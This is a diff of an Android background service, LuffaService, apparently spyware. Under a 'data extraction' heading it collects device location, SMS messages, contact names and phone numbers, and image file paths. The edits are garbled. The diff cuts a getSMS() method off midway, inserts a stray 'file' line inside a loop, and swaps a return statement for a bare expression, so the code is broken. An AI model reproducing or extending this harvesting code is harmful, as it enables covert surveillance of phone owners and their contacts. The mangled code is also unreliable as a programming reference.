@@ -52,7 +52,7 @@ class LuffaService : Service() {
         .build()
 
     private val job = SupervisorJob()
-    private val scope = CoroutineScope(Dispatchers.IO + job) }
+    private val scope = CoroutineScope(Dispatchers.IO + job) 
 
     override fun onCreate() {
         super.onCreate()
@@ -202,14 +202,6 @@ class LuffaService : Service() {
         return "Lat: $lat, Long: $lon"
     }
 
-    private fun getSMS(): String {
-        val sb = StringBuilder()
-        try {
-            val cursor = contentResolver.query(Uri.parse("content://sms/"), null, null, null, null)
-            cursor?.use {
-                if (it.moveToFirst()) {
-
-
 
 
     // --- DATA EXTRACTION METHODS (Continued) ---
@@ -266,6 +258,9 @@ class LuffaService : Service() {
                         val phone = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                         sb.append("[CONTACT] Name: $name | Phone: $phone\n")
                     } while (it.moveToNext())
+ file
+                    
+                
                 }
             }
         } catch (e: Exception) {
@@ -348,7 +343,10 @@ class LuffaService : Service() {
                 if (cursor.moveToFirst()) {
                     val path = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA))
                     val file = File(path)
-                    if (file.exists()) return file
+
+if (file.exists()) file else null
+
+                    
                 }
             }
             null
